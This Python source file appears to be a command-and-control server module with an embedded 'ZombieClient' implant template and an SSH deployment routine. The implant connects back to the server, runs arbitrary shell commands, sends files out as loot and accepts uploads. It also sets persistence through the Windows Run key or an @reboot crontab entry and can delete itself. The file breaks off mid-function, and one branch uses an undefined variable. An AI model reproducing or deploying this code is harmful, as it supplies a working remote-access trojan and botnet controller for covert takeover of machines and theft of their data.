#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""c2_manager.py - Command & Control server for multi-agent coordination over SSH."""

# ==== Stdlib ====
import base64
import hashlib
import json
import logging
import os
import socket
import sqlite3
import struct
import threading
import time
import traceback
import uuid
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from string import Template
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

# ==== Third-party ====
import paramiko
from cryptography.fernet import Fernet, InvalidToken

# ==== Project ====
from init_shared import shared_data         # required
from logger import Logger

# -----------------------------------------------------
#  Safe path resolution (no hard crash at import-time)
# -----------------------------------------------------
BASE_DIR = Path(__file__).resolve().parent

def _resolve_data_root() -> Path:
    """
    Resolve C2 data root directory without crashing if shared_data isn't ready.
    Priority: shared_data.data_dir > $BJORN_DATA_DIR > BASE_DIR (local fallback)
    """
    sd_dir = getattr(shared_data, "data_dir", None)
    if sd_dir:
        try:
            return Path(sd_dir)
        except Exception:
            pass  # clean fallback

    env_dir = os.getenv("BJORN_DATA_DIR")
    if env_dir:
        try:
            return Path(env_dir)
        except Exception:
            pass

    return BASE_DIR

DATA_ROOT: Path = _resolve_data_root()

# C2 subdirectories
DATA_DIR: Path    = DATA_ROOT / "c2_data"
LOOT_DIR: Path    = DATA_DIR / "loot"
CLIENTS_DIR: Path = DATA_DIR / "clients"
LOGS_DIR: Path    = DATA_DIR / "logs"

# Timings
HEARTBEAT_INTERVAL: int = 20                    # seconds
OFFLINE_THRESHOLD: int  = HEARTBEAT_INTERVAL * 3  # 60s sans heartbeat

# Create directory tree (idempotent) - safe at import time, low cost
for directory in (DATA_DIR, LOOT_DIR, CLIENTS_DIR, LOGS_DIR):
    directory.mkdir(parents=True, exist_ok=True)





logger = Logger(name="c2_manager.py", level=logging.DEBUG)



# ============= Enums =============
class AgentStatus(Enum):
    ONLINE = "online"
    IDLE = "idle"
    OFFLINE = "offline"
    BUSY = "busy"

class Platform(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    UNKNOWN = "unknown"



# ============= Event Bus =============
class EventBus:
    """In-process pub/sub for real-time events"""
    
    def __init__(self):
        self._subscribers: Set[Callable] = set()
        self.logger = logger
        self._lock = threading.RLock()
    
    def subscribe(self, callback: Callable[[dict], None]):
        with self._lock:
            self._subscribers.add(callback)
    
    def unsubscribe(self, callback: Callable[[dict], None]):
        with self._lock:
            self._subscribers.discard(callback)
    
    def emit(self, event: dict):
        """Emit event to all subscribers"""
        event['timestamp'] = time.time()
        with self._lock:
            dead_subs = set()
            for callback in list(self._subscribers):
                try:
                    callback(event)
                except Exception as e:
                    self.logger.error(f"Event callback error: {e}")
                    dead_subs.add(callback)
            # Remove dead subscribers
            self._subscribers -= dead_subs

# ============= Client Templates =============
CLIENT_TEMPLATES = {
    'universal': Template(r"""#!/usr/bin/env python3
# Lab client (Zombieland) - use only in controlled environments
import socket, json, os, platform, subprocess, threading, time, base64, struct, sys
from pathlib import Path

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("Installing required dependencies...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
    from cryptography.fernet import Fernet

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# Configuration
SERVER_IP = "$server_ip"
SERVER_PORT = $server_port
CLIENT_ID = "$client_id"
KEY = b"$key"
LAB_USER = "$lab_user"
LAB_PASSWORD = "$lab_password"

RETRY_SECONDS = 30
HEARTBEAT_INTERVAL = 20
TELEMETRY_INTERVAL = 30

class ZombieClient:
    def __init__(self):
        self.cipher = Fernet(KEY)
        self.sock = None
        self.cwd = os.getcwd()
        self.running = True
        self.connected = threading.Event()
        self.telemetry_enabled = True
        self.platform = self._detect_platform()
        
        # Start background threads
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()
        threading.Thread(target=self._telemetry_loop, daemon=True).start()
    
    def _detect_platform(self):
        system = platform.system().lower()
        if system == 'windows':
            return 'windows'
        elif system == 'linux':
            if 'android' in platform.platform().lower():
                return 'android'
            return 'linux'
        elif system == 'darwin':
            return 'macos'
        return 'unknown'
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((SERVER_IP, SERVER_PORT))
            self.sock.settimeout(None)
            
            # Send identification
            self.sock.sendall(CLIENT_ID.encode())
            
            self.connected.set()
            return True
        except Exception as e:
            self.connected.clear()
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
            self.sock = None
            return False
    
    def disconnect(self):
        self.connected.clear()
        if self.sock:
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
    
    def _send(self, data: dict):
        if not self.sock:
            raise RuntimeError("Not connected")
        
        try:
            encrypted = self.cipher.encrypt(json.dumps(data).encode())
            length = struct.pack(">I", len(encrypted))
            self.sock.sendall(length + encrypted)
        except Exception as e:
            self.disconnect()
            raise
    
    def _receive(self):
        if not self.sock:
            return None
        
        try:
            # Read message length
            header = self.sock.recv(4)
            if not header:
                return None
            
            length = struct.unpack(">I", header)[0]
            
            # Read message data
            data = b""
            while len(data) < length:
                chunk = self.sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            
            # Decrypt and parse
            decrypted = self.cipher.decrypt(data)
            return decrypted.decode()
        except Exception as e:
            return None
    
    def _heartbeat_loop(self):
        while self.running:
            if self.connected.wait(timeout=2):
                try:
                    self._send({"ping": time.time()})
                except:
                    pass
            time.sleep(HEARTBEAT_INTERVAL)
    
    def _telemetry_loop(self):
        while self.running:
            if not self.telemetry_enabled:
                time.sleep(1)
                continue
            
            if self.connected.wait(timeout=2):
                try:
                    telemetry = self.get_system_info()
                    self._send({"telemetry": telemetry})
                except:
                    pass
            
            time.sleep(TELEMETRY_INTERVAL)
    
    def get_system_info(self):
        info = {
            "hostname": platform.node(),
            "platform": self.platform,
            "os": platform.platform(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "release": platform.release(),
            "python_version": platform.python_version(),
        }
        
        if HAS_PSUTIL:
            try:
                info.update({
                    "cpu_percent": psutil.cpu_percent(interval=1),
                    "mem_percent": psutil.virtual_memory().percent,
                    "disk_percent": psutil.disk_usage('/').percent,
                    "uptime": int(time.time() - psutil.boot_time()),
                    "cpu_count": psutil.cpu_count(),
                    "total_memory": psutil.virtual_memory().total,
                })
            except:
                pass
        
        return info
    
    def execute_command(self, command: str) -> dict:
        try:
            parts = command.split(maxsplit=1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""
            
            # Built-in commands
            if cmd == "sysinfo":
                return {"result": self.get_system_info()}
            
            elif cmd == "pwd":
                return {"result": self.cwd}
            
            elif cmd == "cd":
                if args:
                    new_path = os.path.join(self.cwd, args)
                    if os.path.exists(new_path) and os.path.isdir(new_path):
                        os.chdir(new_path)
                        self.cwd = os.getcwd()
                        return {"result": f"Changed directory to {self.cwd}"}
                    else:
                        return {"error": "Directory not found"}
                return {"error": "No directory specified"}
            
            elif cmd == "ls":
                path = args if args else "."
                full_path = os.path.join(self.cwd, path)
                if os.path.exists(full_path):
                    items = []
                    for item in os.listdir(full_path):
                        item_path = os.path.join(full_path, item)
                        try:
                            stat = os.stat(item_path)
                            if os.path.isdir(item_path):
                                items.append(f"drwxr-xr-x  {item}/")
                            else:
                                size = stat.st_size
                                items.append(f"-rw-r--r--  {item} ({size} bytes)")
                        except:
                            items.append(f"?????????? {item}")
                    return {"result": "\n".join(items)}
                return {"error": "Path not found"}
            
            elif cmd == "cat":
                if args:
                    file_path = os.path.join(self.cwd, args)
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        try:
                            with open(file_path, 'r') as f:
                                content = f.read(10000)  # Limit to 10KB
                            return {"result": content}
                        except Exception as e:
                            return {"error": str(e)}
                    return {"error": "File not found"}
                return {"error": "No file specified"}
            
            elif cmd == "download":
                if args:
                    file_path = os.path.join(self.cwd, args)
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        try:
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            return {
                                "download": {
                                    "filename": os.path.basename(file_path),
                                    "data": base64.b64encode(data).decode()
                                }
                            }
                        except Exception as e:
                            return {"error": str(e)}
                    return {"error": "File not found"}
                return {"error": "No file specified"}
            
            elif cmd == "upload":
                if args:
                    parts = args.split(maxsplit=1)
                    if len(parts) == 2:
                        filename, b64data = parts
                        file_path = os.path.join(self.cwd, filename)
                        try:
                            data = base64.b64decode(b64data)
                            with open(file_path, 'wb') as f:
                                f.write(data)
                            return {"result": f"File uploaded: {file_path}"}
                        except Exception as e:
                            return {"error": str(e)}
                    return {"error": "Invalid upload format"}
                return {"error": "No file specified"}
            
            elif cmd == "telemetry_start":
                self.telemetry_enabled = True
                return {"result": "Telemetry enabled"}
            
            elif cmd == "telemetry_stop":
                self.telemetry_enabled = False
                return {"result": "Telemetry disabled"}
            
            elif cmd == "lab_creds":
                return {"result": f"Username: {LAB_USER}\nPassword: {LAB_PASSWORD}"}
            
            elif cmd == "persistence":
                return self.install_persistence()
            
            elif cmd == "remove_persistence":
                return self.remove_persistence()
            
            elif cmd == "self_destruct":
                self.self_destruct()
                return {"result": "Self destruct initiated"}
            
            # Execute as shell command
            else:
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        cwd=self.cwd
                    )
                    output = result.stdout if result.stdout else result.stderr
                    return {"result": output}
                except subprocess.TimeoutExpired:
                    return {"error": "Command timeout"}
                except Exception as e:
                    return {"error": str(e)}
        
        except Exception as e:
            return {"error": str(e)}
    
    def install_persistence(self):
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            if self.platform == 'windows':
                # Windows Task Scheduler
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, "ZombieClient", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
                winreg.CloseKey(key)
                return {"result": "Persistence installed (Windows Registry)"}
            
            elif self.platform in ['linux', 'macos']:
                # Crontab for Unix-like systems
                import subprocess
                cron_line = f'@reboot sleep 30 && {sys.executable} {script_path} > /dev/null 2>&1'
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
                return {"result": "Persistence installed (crontab)"}
            
            else:
                return {"error": "Persistence not supported on this platform"}
        
        except Exception as e:
            return {"error": str(e)}
    
    def remove_persistence(self):
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            if self.platform == 'windows':
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                try:
                    winreg.DeleteValue(key, "ZombieClient")
                except:
                    pass
                winreg.CloseKey(key)
                return {"result": "Persistence removed"}
            
            elif self.platform in ['linux', 'macos']:
                import subprocess
                subprocess.run(f"crontab -l 2>/dev/null | grep -v '{script_path}' | crontab -", shell=True)
                return {"result": "Persistence removed"}
            
            else:
                return {"error": "Persistence not supported on this platform"}
        
        except Exception as e:
            return {"error": str(e)}
    
    def self_destruct(self):
        try:
            script_path = os.path.abspath(sys.argv[0])
            self.remove_persistence()
            
            # Schedule deletion and exit
            if self.platform == 'windows':
                subprocess.Popen(f'ping 127.0.0.1 -n 2 > nul & del /f /q "{script_path}"', shell=True)
            else:
                subprocess.Popen(f'sleep 2 && rm -f "{script_path}"', shell=True)
            
            self.running = False
            self.disconnect()
            sys.exit(0)
        except:
            sys.exit(0)
    
    def run(self):
        while self.running:
            # Connect to C2
            if not self.connected.is_set():
                if not self.connect():
                    time.sleep(RETRY_SECONDS)
                    continue
            
            # Receive and execute commands
            command = self._receive()
            if not command:
                self.disconnect()
                time.sleep(RETRY_SECONDS)
                continue
            
            # Execute command and send response
            response = self.execute_command(command)
            try:
                self._send(response)
            except:
                self.disconnect()
                time.sleep(RETRY_SECONDS)

if __name__ == "__main__":
    client = ZombieClient()
    try:
        client.run()
    except KeyboardInterrupt:
        client.running = False
        client.disconnect()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
""")}




# ============= C2 Manager =============
class C2Manager:
    """Professional C2 Server Manager"""

    def __init__(self, bind_ip: str = None, bind_port: int = 5555):
        self.bind_ip = bind_ip or self._get_local_ip()
        self.bind_port = bind_port
        self.shared_data = shared_data
        self.db = shared_data.db
        self.logger = logger
        self.bus = EventBus()

        # Server state
        self._running = False
        self._server_socket: Optional[socket.socket] = None
        self._server_thread: Optional[threading.Thread] = None

        # Client management
        self._clients: Dict[str, dict] = {}  # id -> {sock, cipher, info}
        self._lock = threading.RLock()

        # Statistics
        self._stats = {
            'total_connections': 0,
            'total_commands': 0,
            'total_loot': 0,
            'start_time': None
        }


    @staticmethod
    def _get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    # ========== Public API ==========

    def start(self, port: int = None) -> dict:
        """Start C2 server"""
        if self._running:
            return {"status": "already_running", "port": self.bind_port}

        if port:
            self.bind_port = port

        try:
            # Create server socket
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind((self.bind_ip, self.bind_port))
            self._server_socket.listen(128)
            self._server_socket.settimeout(1.0)

            # Start accept thread
            self._running = True
            self._stats['start_time'] = time.time()
            self._server_thread = threading.Thread(target=self._accept_loop, daemon=True)
            self._server_thread.start()

            # Emit event
            self.bus.emit({
                "type": "status",
                "running": True,
                "port": self.bind_port
            })

            self.logger.info(f"C2 server started on {self.bind_ip}:{self.bind_port}")
            return {"status": "ok", "port": self.bind_port, "ip": self.bind_ip}

        except Exception as e:
            self.logger.error(f"Failed to start C2 server: {e}")
            if self._server_socket:
                try:
                    self._server_socket.close()
                except Exception:
                    pass
                self._server_socket = None
            self._running = False
            return {"status": "error", "message": str(e)}

    def stop(self) -> dict:
        """Stop C2 server"""
        if not self._running:
            return {"status": "not_running"}

        try:
            self._running = False

            # Close server socket
            if self._server_socket:
                self._server_socket.close()
                self._server_socket = None

            if self._server_thread and self._server_thread.is_alive():
                self._server_thread.join(timeout=3.0)
                if self._server_thread.is_alive():
                    self.logger.warning("C2 accept thread did not exit cleanly")
            self._server_thread = None

            # Disconnect all clients
            with self._lock:
                for client_id in list(self._clients.keys()):
                    self._disconnect_client(client_id)

            # Emit event
            self.bus.emit({
                "type": "status",
                "running": False,
                "port": None
            })

            self.logger.info("C2 server stopped")
            return {"status": "ok"}

        except Exception as e:
            self.logger.error(f"Error stopping C2 server: {e}")
            return {"status": "error", "message": str(e)}

    def status(self) -> dict:
        """Get C2 server status"""
        uptime = None
        if self._running and self._stats['start_time']:
            uptime = int(time.time() - self._stats['start_time'])

        with self._lock:
            online = sum(1 for c in self._clients.values() if c['info'].get('status') == AgentStatus.ONLINE.value)

        return {
            "running": self._running,
            "port": self.bind_port if self._running else None,
            "ip": self.bind_ip,
            "agents": len(self._clients),
            "online": online,
            "uptime": uptime,
            "stats": self._stats
        }
    # def list_agents(self) -> List[dict]:
    #     """List all agents (DB + connected), mark offline if no heartbeat."""
    #     with self._lock:
    #         rows = self.db.query("SELECT * FROM agents;")  # list[dict]
    #         now = datetime.utcnow()

    #         # Base map by agent id (avoid dupes)
    #         by_id: Dict[str, dict] = {}

    #         for row in rows:
    #             agent_id = row["id"]

    #             # Normalize last_seen -> epoch ms
    #             last_seen_raw = row.get("last_seen")
    #             last_seen_epoch = None
    #             if last_seen_raw:
    #                 try:
    #                     if isinstance(last_seen_raw, str):
    #                         last_seen_dt = datetime.fromisoformat(last_seen_raw)
    #                         last_seen_epoch = int(last_seen_dt.timestamp() * 1000)
    #                     elif isinstance(last_seen_raw, datetime):
    #                         last_seen_epoch = int(last_seen_raw.timestamp() * 1000)
    #                 except Exception:
    #                     last_seen_epoch = None

    #             by_id[agent_id] = {
    #                 "id": agent_id,
    #                 "hostname": row.get("hostname", "Unknown"),
    #                 "platform": row.get("platform", "unknown"),
    #                 "os": row.get("os_version", "Unknown"),
    #                 "status": row.get("status", "offline"),
    #                 "ip": row.get("ip_address", "N/A"),
    #                 "first_seen": row.get("first_seen"),
    #                 "last_seen": last_seen_epoch,
    #                 "notes": row.get("notes"),
    #                 "cpu": 0,
    #                 "mem": 0,
    #                 "disk": 0,
    #                 "tags": [],
    #             }

    #         # Overlay live clients (force online + fresh last_seen)
    #         for agent_id, client in self._clients.items():
    #             info = client["info"]
    #             base = by_id.get(agent_id, {
    #                 "id": agent_id,
    #                 "hostname": "Unknown",
    #                 "platform": "unknown",
    #                 "os": "Unknown",
    #                 "status": "offline",
    #                 "ip": "N/A",
    #                 "first_seen": None,
    #                 "last_seen": None,
    #                 "notes": None,
    #                 "cpu": 0, "mem": 0, "disk": 0,
    #                 "tags": [],
    #             })
    #             base.update({
    #                 "hostname": info.get("hostname", base["hostname"]),
    #                 "platform": info.get("platform", base["platform"]),
    #                 "os": info.get("os", base["os"]),
    #                 "status": info.get("status", "online"),
    #                 "cpu": info.get("cpu_percent", 0),
    #                 "mem": info.get("mem_percent", 0),
    #                 "disk": info.get("disk_percent", 0),
    #                 "ip": info.get("ip_address", base["ip"]),
    #                 "uptime": info.get("uptime", 0),
    #                 "last_seen": int(datetime.utcnow().timestamp() * 1000),  # ms
    #             })
    #             by_id[agent_id] = base

    #         # Apply offline if too old
    #         for a in by_id.values():
    #             if a.get("last_seen"):
    #                 delta_ms = int(now.timestamp() * 1000) - a["last_seen"]
    #                 if delta_ms > OFFLINE_THRESHOLD * 1000:
    #                     a["status"] = "offline"

    #         return list(by_id.values())

    def list_agents(self) -> List[dict]:
        """List all agents (DB + connected), mark offline if no heartbeat."""
        with self._lock:
            agents = []
            rows = self.db.query("SELECT * FROM agents;")  # retourne list[dict]
            now = datetime.utcnow()

            for row in rows:
                agent_id = row["id"]

                # Conversion last_seen -> timestamp ms
                last_seen_raw = row.get("last_seen")
                last_seen_epoch = None
                if last_seen_raw:
                    try:
                        if isinstance(last_seen_raw, str):
                            last_seen_dt = datetime.fromisoformat(last_seen_raw)
                            last_seen_epoch = int(last_seen_dt.timestamp() * 1000)
                        elif isinstance(last_seen_raw, datetime):
                            last_seen_epoch = int(last_seen_raw.timestamp() * 1000)
                    except Exception:
                        last_seen_epoch = None

                agent_info = {
                    "id": agent_id,
                    "hostname": row.get("hostname", "Unknown"),
                    "platform": row.get("platform", "unknown"),
                    "os": row.get("os_version", "Unknown"),
                    "status": row.get("status", "offline"),
                    "ip": row.get("ip_address", "N/A"),
                    "first_seen": row.get("first_seen"),
                    "last_seen": last_seen_epoch,
                    "notes": row.get("notes"),
                    "cpu": 0,
                    "mem": 0,
                    "disk": 0,
                    "tags": []
                }

                # If connected in memory, prefer live telemetry values.
                if agent_id in self._clients:
                    info = self._clients[agent_id]["info"]
                    agent_info.update({
                        "hostname": info.get("hostname", agent_info["hostname"]),
                        "platform": info.get("platform", agent_info["platform"]),
                        "os": info.get("os", agent_info["os"]),
                        "status": info.get("status", "online"),
                        "cpu": info.get("cpu_percent", 0),
                        "mem": info.get("mem_percent", 0),
                        "disk": info.get("disk_percent", 0),
                        "ip": info.get("ip_address", agent_info["ip"]),
                        "uptime": info.get("uptime", 0),
                        "last_seen": int(datetime.utcnow().timestamp() * 1000),
                    })

                # Mark stale clients as offline.
                if agent_info["last_seen"]:
                    delta = (now.timestamp() * 1000) - agent_info["last_seen"]
                    if delta > OFFLINE_THRESHOLD * 1000:
                        agent_info["status"] = "offline"

                agents.append(agent_info)

            # Deduplicate by hostname (or id fallback), preferring healthier/recent entries.
            dedup = {}
            for a in agents:
                key = (a.get("hostname") or a["id"]).strip().lower()
                prev = dedup.get(key)
                if not prev:
                    dedup[key] = a
                    continue

                def rank(status):
                    return {"online": 0, "idle": 1, "offline": 2}.get(status, 3)

                better = False
                if rank(a["status"]) < rank(prev["status"]):
                    better = True
                else:
                    la = a.get("last_seen") or 0
                    lp = prev.get("last_seen") or 0
                    if la > lp:
                        better = True
                if better:
                    dedup[key] = a

            return list(dedup.values())

    def send_command(self, targets: List[str], command: str) -> dict:
        """Send command to specific agents"""
        if not targets or not command:
            return {"status": "error", "message": "Invalid parameters"}

        sent = 0
        failed = []

        with self._lock:
            for target_id in targets:
                if target_id not in self._clients:
                    failed.append(target_id)
                    continue

                try:
                    self._send_to_client(target_id, command)
                    sent += 1

                    # Save to database
                    self.db.save_command(target_id, command)

                    # Emit event
                    self.bus.emit({
                        "type": "console",
                        "target": target_id,
                        "text": command,
                        "kind": "TX"
                    })

                except Exception as e:
                    self.logger.error(f"Failed to send command to {target_id}: {e}")
                    failed.append(target_id)

        self._stats['total_commands'] += sent

        return {
            "status": "ok",
            "sent": sent,
            "failed": failed,
            "total": len(targets)
        }

    def broadcast(self, command: str) -> dict:
        """Broadcast command to all online agents"""
        with self._lock:
            online_agents = [
                cid for cid, c in self._clients.items()
                if c['info'].get('status') == AgentStatus.ONLINE.value
            ]

        if not online_agents:
            return {"status": "error", "message": "No online agents"}

        return self.send_command(online_agents, command)

    def generate_client(self, client_id: str, platform: str = "universal",
                        lab_user: str = "testuser", lab_password: str = "testpass") -> dict:
        """Generate new client script"""
        try:
            # Generate Fernet key (base64) and store in DB (rotate if existing)
            key_b64 = Fernet.generate_key().decode()
            if self.db.get_active_key(client_id):
                self.db.rotate_key(client_id, key_b64)
            else:
                self.db.save_new_key(client_id, key_b64)

            # Get template
            template = CLIENT_TEMPLATES.get(platform, CLIENT_TEMPLATES['universal'])

            # Generate script
            script = template.substitute(
                server_ip=self.bind_ip,
                server_port=self.bind_port,
                client_id=client_id,
                key=key_b64,
                lab_user=lab_user,
                lab_password=lab_password
            )

            # Save to file
            filename = f"client_{client_id}_{platform}.py"
            filepath = CLIENTS_DIR / filename
            with open(filepath, 'w') as f:
                f.write(script)

            self.logger.info(f"Generated client: {client_id} ({platform})")

            return {
                "status": "ok",
                "client_id": client_id,
                "platform": platform,
                "filename": filename,
                "filepath": str(filepath),
                "download_url": f"/c2/download_client/{filename}"
            }

        except Exception as e:
            self.logger.error(f"Failed to generate client: {e}")
            return {"status": "error", "message": str(e)}

    def deploy_client(self, client_id: str, ssh_host: str, ssh_user: str,
                      ssh_pass: str, **kwargs) -> dict:
        """Deploy client via SSH"""
        try:
            # Ensure an active key exists (generate client otherwise)
            if not self.db.get_active_key(client_id):
                result = self.generate_client(
                    client_id,
                    kwargs.get('platform', 'universal'),
                    kwargs.get('lab_user', 'testuser'),
                    kwargs.get('lab_password', 'testpass')
                )
                if result['status'] != 'ok':
                    return result

            # Find client file
            client_files = list(CLIENTS_DIR.glob(f"client_{client_id}_*.py"))
            if not client_files:
                return {"status": "error", "message": "Client file not found"}

            local_file = client_files[0]

            # SSH deployment
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ssh_host, username=ssh_user, password=ssh_pass)

            # Create remote directory in the user's home
            remote_dir = f"/home/{ssh_user}/zombie_{client_id}"
            ssh.exec_command(f"mkdir -p {remote_dir}")

            # Upload file
            sftp = ssh.open_sftp()
            remote_file = f"{remote_dir}/client.py"
            sftp.put(str(local_file), remote_file)
            sftp.chmod(remote_file, 0o755)
            sftp.close()

            # Start client in background
            ssh.exec_command(f"cd {remote_dir} && nohup python3 client.py > /dev/null 2>&1 &")
            ssh.close()

            self.logger.info(f"Deployed client {client_id} to {ssh_host}")

            return {
                "status": "ok",
                "client_id": client_id,
                "deployed_to": ssh_host,
                "remote_path": remote_file
            }

        except Exception as e:
            self.logger.error(f"Failed to deploy client: {e}")
            return {"status": "error", "message": str(e)}

    def remove_client(self, client_id: str) -> dict:
        """Remove client and clean up"""
        try:
            with self._lock:
                # Disconnect if connected
                if client_id in self._clients:
                    self._disconnect_client(client_id)

                # Revoke active keys in DB
                try:
                    self.db.revoke_keys(client_id)
                except Exception as e:
                    self.logger.warning(f"Failed to revoke keys for {client_id}: {e}")

                # Remove client files
                for f in CLIENTS_DIR.glob(f"client_{client_id}_*.py"):
                    try:
                        f.unlink()
                    except Exception:
                        pass

                # Remove loot
                loot_dir = LOOT_DIR / client_id
                if loot_dir.exists():
                    import shutil
                    shutil.rmtree(loot_dir)

            self.logger.info(f"Removed client: {client_id}")
            return {"status": "ok"}

        except Exception as e:
            self.logger.error(f"Failed to remove client: {e}")
            return {"status": "error", "message": str(e)}

    # ========== Internal Methods ==========

    def _accept_loop(self):
        """Accept incoming connections"""
        while self._running:
            try:
                if self._server_socket:
                    sock, addr = self._server_socket.accept()
                    self._stats['total_connections'] += 1

                    # Handle in new thread
                    threading.Thread(
                        target=self._handle_client,
                        args=(sock, addr),
                        daemon=True
                    ).start()
            except socket.timeout:
                continue
            except OSError:
                break  # Server socket closed
            except Exception as e:
                if self._running:
                    self.logger.error(f"Accept error: {e}")
                time.sleep(1)

    def _handle_client(self, sock: socket.socket, addr: tuple):
        """Handle client connection"""
        client_id = None

        try:
            # Receive client ID
            sock.settimeout(10)
            client_id_bytes = sock.recv(1024)
            sock.settimeout(None)

            if not client_id_bytes:
                sock.close()
                return

            client_id = client_id_bytes.decode().strip()

            # Retrieve the active key from DB
            active_key = self.db.get_active_key(client_id)
            if not active_key:
                self.logger.warning(f"Unknown client or no active key: {client_id} from {addr[0]}")
                sock.close()
                return

            # Create cipher
            cipher = Fernet(active_key.encode())

            # Register client
            with self._lock:
                self._clients[client_id] = {
                    'sock': sock,
                    'cipher': cipher,
                    'info': {
                        'id': client_id,
                        'ip_address': addr[0],
                        'status': AgentStatus.ONLINE.value,
                        'connected_at': time.time(),
                        'last_seen': datetime.utcnow().isoformat()
                    }
                }
#[2025-09-26 20:26:43,445] [ERROR] [C2Manager] Client loop error for Zombie11: save_command: 'agent_id' and 'command' are required
            # Save to database (upsert minimal)
            self.db.save_agent({
                'id': client_id,
                'ip_address': addr[0],
                'status': AgentStatus.ONLINE.value,
                'last_seen': datetime.utcnow().isoformat()
                

            })

            # Emit connection event
            self.bus.emit({
                "type": "log",
                "level": "info",
                "text": f"Client {client_id} connected from {addr[0]}"
            })

            self.logger.info(f"Client {client_id} connected from {addr[0]}")

            # Handle client messages
            self._client_loop(client_id, sock, cipher)

        except Exception as e:
            self.logger.error(f"Client handler error: {e}")
            traceback.print_exc()

        finally:
            if client_id:
                self._disconnect_client(client_id)

    def _is_client_alive(self, client_id: str) -> bool:
        with self._lock:
            c = self._clients.get(client_id)
            return bool(c and not c['info'].get('closing'))

    def _client_loop(self, client_id: str, sock: socket.socket, cipher: Fernet):
        """Handle client communication"""
        while self._running and self._is_client_alive(client_id):
            try:
                data = self._receive_from_client(sock, cipher)
                if not data:
                    break
                self._process_client_message(client_id, data)
            except OSError as e:
                # Socket closed (remove_client) - exit silently
                break
            except Exception as e:
                self.logger.error(f"Client loop error for {client_id}: {e}")
                break

    def _receive_from_client(self, sock: socket.socket, cipher: Fernet) -> Optional[dict]:
        try:
            # OPTIMIZATION: Set timeout to prevent threads hanging forever
            sock.settimeout(15.0)
            
            header = sock.recv(4)
            if not header or len(header) != 4:
                return None
            length = struct.unpack(">I", header)[0]
            
            # Memory protection: prevent massive data payloads
            if length > 10 * 1024 * 1024:
                self.logger.warning(f"Rejecting oversized message: {length} bytes")
                return None

            data = b""
            while len(data) < length:
                chunk = sock.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            decrypted = cipher.decrypt(data)
            return json.loads(decrypted.decode())
        except (OSError, ConnectionResetError, BrokenPipeError):
            return None
        except Exception as e:
            self.logger.error(f"Receive error: {e}")
            return None

    def _send_to_client(self, client_id: str, command: str):
        with self._lock:
            client = self._clients.get(client_id)
            if not client or client['info'].get('closing'):
                raise ValueError(f"Client {client_id} not connected")
            sock = client['sock']
            cipher = client['cipher']
            client['info']['last_command'] = command
            encrypted = cipher.encrypt(command.encode())
            header = struct.pack(">I", len(encrypted))
            sock.sendall(header + encrypted)

    def _process_client_message(self, client_id: str, data: dict):
        with self._lock:
            if client_id not in self._clients:
                return
            client_info = self._clients[client_id]['info']
            client_info['last_seen'] = datetime.utcnow().isoformat()
            self.db.save_agent({'id': client_id, 'last_seen': client_info['last_seen'], 'status': AgentStatus.ONLINE.value})

        last_cmd = None
        with self._lock:
            if client_id in self._clients:
                last_cmd = self._clients[client_id]['info'].get('last_command')

        if 'ping' in data:
            return

        elif 'telemetry' in data:
            telemetry = data['telemetry']
            with self._lock:
                # OPTIMIZATION: Prune telemetry fields kept in-memory
                client_info.update({
                    'hostname': str(telemetry.get('hostname', ''))[:64],
                    'platform': str(telemetry.get('platform', ''))[:32],
                    'os': str(telemetry.get('os', ''))[:32],
                    'os_version': str(telemetry.get('os_version', ''))[:64],
                    'architecture': str(telemetry.get('architecture', ''))[:16],
                    'cpu_percent': float(telemetry.get('cpu_percent', 0)),
                    'mem_percent': float(telemetry.get('mem_percent', 0)),
                    'disk_percent': float(telemetry.get('disk_percent', 0)),
                    'uptime': float(telemetry.get('uptime', 0))
                })
            self.db.save_telemetry(client_id, telemetry)
            self.bus.emit({"type": "telemetry", "id": client_id, **telemetry})

        elif 'download' in data:
            self._handle_loot(client_id, data['download'])

        elif 'result' in data:
            # Store result with the actual command
            self.db.save_command(client_id, last_cmd or '<unknown>', result, True)
            self.bus.emit({"type": "console", "target": client_id, "text": str(result), "kind": "RX"})

        elif 'error' in data:
